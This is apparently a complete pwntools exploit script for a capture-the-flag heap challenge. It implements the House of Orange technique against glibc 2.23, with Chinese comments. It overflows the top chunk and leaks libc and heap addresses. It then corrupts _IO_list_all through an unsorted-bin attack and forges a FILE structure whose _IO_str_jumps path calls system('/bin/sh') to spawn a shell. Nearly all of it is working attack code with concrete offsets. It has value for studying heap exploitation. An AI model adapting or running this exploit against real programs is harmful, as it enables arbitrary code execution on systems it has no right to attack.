#house of orange
from pwn import*
import sys
context.log_level = 'debug'
elf=ELF('./pwn')
libc=ELF('./libc-2.23.so')

p=process('./pwn')
# gdb.attach(p,'''
# b *$rebase(0x00888)
# b* $rebase(0xC0F)
# b* $rebase(0xBAC)''')
# pause()

#topchunk->unsortedbin
# while True:
#     try:      

def add(size,content):
    p.sendafter('Input your choice >> ',b'1')
    p.sendafter('How long is your note?',str(size).encode())
    p.sendafter('Please write your note now:',content)

def show():
    p.sendafter('Input your choice >> ',b'2')

def change(idx,size,content):
    p.sendafter('Input your choice >> ',b'3')
    p.sendafter('Which note do you want to change?',str(idx).encode())
    p.sendafter('Please input the size of your note:',str(size).encode())
    p.sendafter('Please write your new note:',content)

#在无free情况下获取unsortedbin块
add(0x20,b"aaaa")
change(0,-1,p64(0)*5+p64(0xfd1))
add(0x1000,b'a')
add(0x400,b'b'*8)
show()

#泄露libc地址
p.recvuntil(f'No.2 note: ')
p.recvuntil(b'b'*8)
addr=u64(p.recv(6).ljust(8,b'\x00'))
print(f'Address: {hex(addr)}')
libc_base=addr-0x3c5188
print(f'libc_base: {hex(libc_base)}')
io_list=libc_base+0x3c5520
_IO_str_jumps=libc_base+0x3c37a0
system=libc_base+0x45390

#泄露heap地址，方便后续在堆上放置/bin/sh
#前面add(0x400,b'b'*8)时遍历unsortedbin时将chunk2放入largebin留下了fd_nextsize与bk_nextsize，用于泄露heap地址
#然后在遍历largebin时将chunk2切割
change(2,0x100,b'c'*0x10)
show()
p.recvuntil(f'No.2 note: ')
p.recvuntil(b'c'*0x10)
addr1=u64(p.recv(6).ljust(8,b'\x00'))
print(f'Address1: {hex(addr1)}')
heap_base=addr1-0x60
print(f'heap_base: {hex(heap_base)}')
binsh=heap_base+0x558

#在chunk2后面的chunk上伪造io
#将vtable改为合法的_IO_str_jumps，进而利用_IO_str_jumps中的io_str_overflow函数执行system("/bin/sh")
#io_str_overflow会调用 (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size)
#flags绕过要求： flags&0x1==flags&0x8==0
payload=p64(0xfffffff0)+p64(0x61) #这里的0xfffffff0会影响main_arena+0x148处的值，而那里对应的是main_arena+88为开头的io结构的mode，经测验，这个值能同时满足绕过条件并使mode值为负数
payload+=p64(0)+p64(io_list-0x10)
payload+=p64(0)+p64((binsh-100) // 2 +1) #_IO_write_base与_IO_write_ptr 
payload+=p64(0)*2+p64((binsh-100) // 2) #_IO_buf_end
#new_size = 2 * (fp->_ IO_buf_end - fp->_IO_buf_base) + 100; 应当等于 /bin/sh字符串 对应的地址
payload=payload.ljust(0xd8,b'\x00')
payload+=p64(_IO_str_jumps)
payload+=p64(system) #_allocate_buffer
payload+=b'/bin/sh\x00'
change(2,0x600,b'a'*0x400+payload)

#这里会触发abort进而进入fflush,触发的原因是因为在unsortedbin attack时篡改了第一个unsortedbin chunk的bk值为io_list_all-0x10
#而后续也就是这里调用malloc时取出的就是io_list_all-0x10处的chunk，自然非法
p.sendafter('Input your choice >> ',b'1')
p.sendafter('How long is your note?',str(0x100).encode())




p.interactive()

    #         p.sendline(b'echo Pwned')
    #         p.sendline(b'echo Pwned')
    #         result=p.recvuntil(b'Pwned',timeout=0.2)
    #         if b'Pwned' in result:
    #             print('Exploit successful!')
    #             p.interactive()
    #             break
    #         p.close()

    # except KeyboardInterrupt:
    #     p.close()
    #     sys.exit(0)

    # except Exception as e:
    #     print(e)
    #     p.close()
    #     continue